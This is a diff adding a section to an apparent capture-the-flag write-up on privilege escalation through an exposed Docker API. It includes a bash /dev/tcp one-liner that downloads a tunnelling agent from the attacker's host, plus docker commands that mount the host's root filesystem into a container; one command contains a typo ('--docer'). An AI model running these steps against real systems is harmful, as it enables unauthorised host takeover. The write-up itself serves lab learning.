@@ -248,6 +248,53 @@ The root flag is found in the *Administrator*'s desktop as always:
 
 ![](attachments/ce2fb29a26d6017da36b45959015c69e.png)
 
+## Docker CLI - Alternative Priv Esc
+
+Instead of sending `curl` commands to the `docker` API we can also leverage `ligolo` to set up a tunnel, then use `docker` cli commands from our own host. 
+I downloaded over `ligolo` to the target and ran the agent:
+
+```bash
+export RHOST=10.10.14.9
+export RPORT=8000
+export LFILE=agent
+bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
+    3<>/dev/tcp/$RHOST/$RPORT \
+    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
+```
+
+Accordingly we set up the ligolo tunnel to the external interface and we can now get to work.
+
+![](attachments/ligolo.png)
+
+I used the following commands to create a container and use the image:
+
+```bash
+docker context create monitors --docer "host=tcp://192.168.65.7:2375"
+```
+
+![](attachments/docker1.png)
+
+Then used these commands to check whether the the container and image were up and running:
+
+```bash
+docker ps
+docker images
+```
+
+![](attachments/docker2.png)
+
+And lastly ran the image in "opsec" mode (`--rm`):
+
+```bash
+docker run -it --rm -v /:/mnt alpine sh
+```
+
+![](attachments/docker3.png)
+
+Hereafter I was able to view the contents of the filesystem:
+
+![](attachments/docker4.png)
+
 ![](attachments/1888a9a6948173877d31aab9cf2db74a.png)
 
 </PasswordProtect>
